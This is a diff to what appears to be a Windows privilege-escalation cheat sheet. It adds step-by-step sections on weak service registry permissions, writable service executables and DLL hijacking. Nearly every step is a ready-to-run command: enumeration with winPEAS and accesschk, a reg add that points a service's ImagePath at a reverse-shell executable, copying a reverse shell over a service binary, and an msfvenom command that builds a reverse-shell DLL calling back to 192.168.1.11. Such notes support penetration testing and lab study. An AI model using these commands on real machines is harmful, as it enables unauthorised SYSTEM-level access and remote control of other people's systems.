@@ -578,7 +578,7 @@ More information here:
    C:\Program Files\Unquoted Path Service\Common Files\service_name.exe
    ```
 
-3. Perform a query to the service with  sc to confirm this:
+3. Perform a query to the service with sc to confirm this:
 
    ```text
    > sc qc <unquoted_service_name>
@@ -617,6 +617,121 @@ move filename.exe "c:\program files\service\filename.exe"
 ```
 
 **Restart the service or the machine.**
+
+### Weak Registry Permissions
+
+Each service has its own entry in the Windows registry. Because registry entries might have ACLs, if the ACL is misconfigured, we could be able to change the configuration of some services even though we can't change the service directly.
+
+#### Weak Registry Permissions Privilege Escalation
+
+1. To check for service misconfigurations, run winPEAS:
+
+   ```text
+   > .\winPEASany.exe quiet servicesinfo
+   ```
+
+2. Check if a service has a weak registry entry. We can confirm this with the Get-Acl cmdlet:
+
+   ```text
+   PS> Get-Acl HKLM:\System\CurrentControlSet\Services\service_name | Format-List
+   ```
+
+3. Alternatively, we can use accesschk.exe to confirm this:
+
+   ```text
+   > .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\service_name
+   ```
+
+4. Try to overwrite the ImagePath registry key to point to our reverse shell executable:
+
+   ```text
+   > reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\Public\reverse.exe /f
+   ```
+
+5. Start a listener on our host \(e.g Kali or Parrot\), and then start the service to trigger the exploit:
+
+   ```text
+   > net start regsvc
+   ```
+
+### **Insecure Service Executables**
+
+If our user can modify the original service executable, we can easily replace it with our reverse shell executable. If you're going to use this in a real system, make a backup of the original executable.
+
+1. Enumerate services misconfiguration with winPEAS:
+
+   ```text
+   > .\winPEASany.exe quiet servicesinfo
+   ```
+
+2. If the service has an executable that appears to be writable by everyone.
+
+   ```text
+   > .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\service_name.exe"
+   ```
+
+3. Create a backup of the original service executable:
+
+   ```text
+   > copy "C:\Program Files\File Permissions Service\service_name.exe" C:\Temp
+   ```
+
+4. Copy the reverse shell executable to overwrite the service executable:
+
+   ```text
+   > copy /Y C:\Users\Public\reverse.exe "C:\Program Files\File Permissions Service\service_name.exe"
+   ```
+
+5. Start a listener on our host \(e.g Kali or Parrot\), and then start the service to trigger the exploit:
+
+   ```text
+   > net start filepermsvc
+   ```
+
+### **DLL Hijacking**
+
+If a DLL is missing from the system and our user has to have write access to a directory within the PATH where Windows looks for DLLs, this is a more common misconfiguration that can be used to escalate privileges. 
+
+#### DLL Hijacking Privilege Escalation
+
+1. To enumerate non-Windows services, we can use winPEAS:
+
+   ```text
+   > .\winPEASany.exe quiet servicesinfo
+   ```
+
+2. Find a directory that is writable and in the PATH. Begin by enumerating which of these services our user has stop and start access to:
+
+   ```text
+   > .\accesschk.exe /accepteula -uvqc user service_name
+   ```
+
+3. If the service is vulnerable to DLL Hijacking.
+
+   ```text
+   > sc qc service_name
+   ```
+
+   > Note: Use ProcMon.exe to see if the executable uses any DLL files.
+
+4. Start the service:
+
+   ```text
+   > net start service_name
+   ```
+
+5. On our host, we'll generate a reverse shell DLL named dll\_hijacking.dll:
+
+   ```text
+   # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o dll_hijacking.dll
+   ```
+
+6. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on our host \(e.g Kali or Parrot\) and then stop/start the service to trigger the exploit:
+
+   ```text
+   > net stop service_name
+   > net start service_name
+   ```
 
 ## Registry
 
